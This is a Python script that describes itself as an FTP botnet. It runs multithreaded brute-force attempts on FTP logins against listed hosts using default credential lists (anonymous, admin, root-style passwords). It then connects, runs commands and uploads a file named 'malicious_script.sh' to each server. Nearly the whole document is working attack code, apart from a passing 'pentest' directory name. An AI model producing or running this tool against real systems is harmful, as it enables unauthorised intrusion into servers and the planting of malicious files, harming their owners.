
import ftplib
import threading
from queue import Queue
from colorama import Fore, Style

# Thread lock to prevent race conditions during output
print_lock = threading.Lock()

# Define a Queue to manage the botnet tasks
task_queue = Queue()

# Define a list of compromised hosts (or empty for brute-forcing)
compromised_hosts = [
    {"ip": "192.168.1.10", "username": "anonymous", "password": ""},
    {"ip": "192.168.1.11", "username": "admin", "password": "adminpass"},
    # Add more hosts or leave empty to use brute-force
]

# Brute-force user and password lists for FTP login (if credentials are unknown)
username_list = ['anonymous', 'admin', 'user', 'ftp']
password_list = ['admin', '12345', 'password', 'ftp', 'root']

# Command to run on the FTP server (e.g., list files, create directory)
ftp_command = "LIST"

# File to be uploaded to the server (optional)
file_to_upload = "malicious_script.sh"


# Function to brute-force FTP login if credentials are unknown
def ftp_brute_force(host):
    for username in username_list:
        for password in password_list:
            try:
                # Try connecting with each username and password
                ftp = ftplib.FTP(host['ip'])
                ftp.login(username, password)
                
                with print_lock:
                    print(Fore.GREEN + f"[+] Brute-force successful for {host['ip']} with {username}/{password}" + Style.RESET_ALL)
                
                # Update host dictionary if successful
                host['username'] = username
                host['password'] = password
                ftp.quit()
                return True

            except ftplib.error_perm:
                # If login fails, try next combination
                pass
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"[-] Connection failed to {host['ip']}: {str(e)}" + Style.RESET_ALL)
                return False
    return False


# Function to connect to an FTP server and execute commands
def ftp_connect_and_execute(host):
    try:
        # Connect to the FTP server
        ftp = ftplib.FTP(host['ip'])
        ftp.login(host['username'], host['password'])

        with print_lock:
            print(Fore.BLUE + f"[+] Successfully connected to {host['ip']}" + Style.RESET_ALL)

        # Execute the FTP command (e.g., LIST, PWD, etc.)
        if ftp_command == "LIST":
            ftp.retrlines('LIST', callback=print)
        elif ftp_command == "PWD":
            print(f"Current directory: {ftp.pwd()}")
        elif ftp_command == "MKDIR":
            ftp.mkd('pentest_dir')
            print(f"Directory 'pentest_dir' created.")
        
        # Optional: upload a file to the FTP server
        if file_to_upload:
            with open(file_to_upload, 'rb') as file:
                ftp.storbinary(f'STOR {file_to_upload}', file)
            print(Fore.CYAN + f"[+] File {file_to_upload} uploaded to {host['ip']}" + Style.RESET_ALL)

        ftp.quit()

    except ftplib.error_perm:
        with print_lock:
            print(Fore.RED + f"[-] Authentication failed for {host['ip']}" + Style.RESET_ALL)
        # Attempt brute-forcing credentials
        brute_force_success = ftp_brute_force(host)
        if brute_force_success:
            ftp_connect_and_execute(host)  # Retry with found credentials
    
    except Exception as e:
        with print_lock:
            print(Fore.RED + f"[-] Connection failed to {host['ip']}: {str(e)}" + Style.RESET_ALL)


# Worker function for multithreading
def worker():
    while True:
        host = task_queue.get()  # Get a host from the queue
        ftp_connect_and_execute(host)  # Try to connect and execute commands
        task_queue.task_done()  # Mark the task as done


# Main function to start the botnet
def main():
    number_of_threads = 10  # Adjust the number of threads based on the scale of the attack

    # Start the worker threads
    for _ in range(number_of_threads):
        thread = threading.Thread(target=worker)
        thread.daemon = True  # Daemonize threads to exit with the program
        thread.start()

    # Add the compromised hosts to the task queue
    for host in compromised_hosts:
        task_queue.put(host)
    
    task_queue.join()  # Wait for all tasks to complete
    print("\n[+] All tasks completed on all hosts.")


if __name__ == "__main__":
    main()
